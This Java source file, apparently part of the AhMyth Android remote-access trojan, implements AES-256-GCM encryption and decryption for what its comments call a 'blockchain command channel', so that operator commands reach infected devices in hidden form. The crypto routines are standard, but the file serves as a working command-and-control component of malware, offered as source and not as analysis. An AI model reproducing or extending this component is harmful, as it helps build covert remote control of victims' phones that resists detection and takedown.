package ahmyth.mine.king.ahmyth;

import android.util.Log;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;

/**
 * BlockchainCrypto - AES-256-GCM encryption/decryption for blockchain command channel
 * 
 * Encryption format:
 * - nonce: 12 bytes (unique per command)
 * - ciphertext: variable length
 * - authTag: 16 bytes (GCM authentication tag)
 * 
 * Full encrypted payload: nonce (12) + ciphertext + authTag (16)
 */
public class BlockchainCrypto {
    private static final String TAG = "BlockchainCrypto";
    private static final String ALGORITHM = "AES";
    private static final String TRANSFORMATION = "AES/GCM/NoPadding";
    private static final int GCM_IV_LENGTH = 12;
    private static final int GCM_TAG_LENGTH = 16;
    
    /**
     * Decrypt encrypted command from blockchain
     * 
     * @param encryptedHex Hex-encoded encrypted data (nonce + ciphertext + tag)
     * @param sharedKey 32-byte AES key
     * @return Decrypted plaintext command
     */
    public static String decrypt(String encryptedHex, byte[] sharedKey) {
        try {
            // Convert hex to bytes
            byte[] encryptedBytes = hexStringToByteArray(encryptedHex);
            
            if (encryptedBytes.length < GCM_IV_LENGTH + GCM_TAG_LENGTH) {
                Log.e(TAG, "Encrypted data too short");
                return null;
            }
            
            // Extract nonce (first 12 bytes)
            byte[] nonce = new byte[GCM_IV_LENGTH];
            System.arraycopy(encryptedBytes, 0, nonce, 0, GCM_IV_LENGTH);
            
            // Extract auth tag (last 16 bytes)
            byte[] tag = new byte[GCM_TAG_LENGTH];
            System.arraycopy(encryptedBytes, encryptedBytes.length - GCM_TAG_LENGTH, tag, 0, GCM_TAG_LENGTH);
            
            // Extract ciphertext (middle bytes)
            int ciphertextLength = encryptedBytes.length - GCM_IV_LENGTH - GCM_TAG_LENGTH;
            byte[] ciphertext = new byte[ciphertextLength];
            System.arraycopy(encryptedBytes, GCM_IV_LENGTH, ciphertext, 0, ciphertextLength);
            
            // Create secret key
            SecretKeySpec keySpec = new SecretKeySpec(sharedKey, ALGORITHM);
            
            // Create GCM parameter spec
            GCMParameterSpec gcmSpec = new GCMParameterSpec(GCM_TAG_LENGTH * 8, nonce);
            
            // Initialize cipher for decryption
            Cipher cipher = Cipher.getInstance(TRANSFORMATION);
            cipher.init(Cipher.DECRYPT_MODE, keySpec, gcmSpec);
            
            // Decrypt
            byte[] decrypted = cipher.doFinal(ByteBuffer.allocate(ciphertext.length + tag.length)
                .put(ciphertext)
                .put(tag)
                .array());
            
            return new String(decrypted, StandardCharsets.UTF_8);
            
        } catch (Exception e) {
            Log.e(TAG, "Decryption failed", e);
            return null;
        }
    }
    
    /**
     * Encrypt plaintext command (for testing/operator use)
     * 
     * @param plaintext Command to encrypt
     * @param sharedKey 32-byte AES key
     * @return Hex-encoded encrypted data (nonce + ciphertext + tag)
     */
    public static String encrypt(String plaintext, byte[] sharedKey) {
        try {
            // Generate random nonce (12 bytes)
            byte[] nonce = new byte[GCM_IV_LENGTH];
            java.security.SecureRandom random = new java.security.SecureRandom();
            random.nextBytes(nonce);
            
            // Create secret key
            SecretKeySpec keySpec = new SecretKeySpec(sharedKey, ALGORITHM);
            
            // Create GCM parameter spec
            GCMParameterSpec gcmSpec = new GCMParameterSpec(GCM_TAG_LENGTH * 8, nonce);
            
            // Initialize cipher for encryption
            Cipher cipher = Cipher.getInstance(TRANSFORMATION);
            cipher.init(Cipher.ENCRYPT_MODE, keySpec, gcmSpec);
            
            // Encrypt
            byte[] encrypted = cipher.doFinal(plaintext.getBytes(StandardCharsets.UTF_8));
            
            // Extract ciphertext and tag
            // GCM mode: encrypted = ciphertext + tag
            int ciphertextLength = encrypted.length - GCM_TAG_LENGTH;
            byte[] ciphertext = new byte[ciphertextLength];
            byte[] tag = new byte[GCM_TAG_LENGTH];
            System.arraycopy(encrypted, 0, ciphertext, 0, ciphertextLength);
            System.arraycopy(encrypted, ciphertextLength, tag, 0, GCM_TAG_LENGTH);
            
            // Combine: nonce + ciphertext + tag
            ByteBuffer buffer = ByteBuffer.allocate(GCM_IV_LENGTH + ciphertextLength + GCM_TAG_LENGTH);
            buffer.put(nonce);
            buffer.put(ciphertext);
            buffer.put(tag);
            
            return bytesToHexString(buffer.array());
            
        } catch (Exception e) {
            Log.e(TAG, "Encryption failed", e);
            return null;
        }
    }
    
    /**
     * Convert hex string to byte array
     */
    private static byte[] hexStringToByteArray(String hex) {
        int len = hex.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4)
                                 + Character.digit(hex.charAt(i+1), 16));
        }
        return data;
    }
    
    /**
     * Convert byte array to hex string
     */
    private static String bytesToHexString(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) {
            sb.append(String.format("%02x", b));
        }
        return sb.toString();
    }
}











